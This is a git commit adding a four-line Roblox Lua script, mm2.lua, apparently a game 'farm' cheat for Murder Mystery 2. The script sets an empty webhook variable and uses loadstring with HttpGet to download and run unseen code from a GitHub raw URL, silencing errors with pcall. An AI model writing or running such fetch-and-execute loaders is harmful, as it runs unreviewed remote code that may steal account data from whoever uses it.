45d76b2f24fd4ce286f8b6a06caac02807ba5a17
scripts-uploader <lestlestlesthi@gmail.com>
2025-07-26 17:20:00 +0200

    Create mm2.lua

---
+++ mm2.lua
@@ -0,0 +1,4 @@
+getgenv().webhook = ""
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts-uploader/NASIKS-Mm2-beachball-farm-v3-safest-/refs/heads/main/NASIKS-Mm2-beachball-farm-v3-safest"))()
+end)
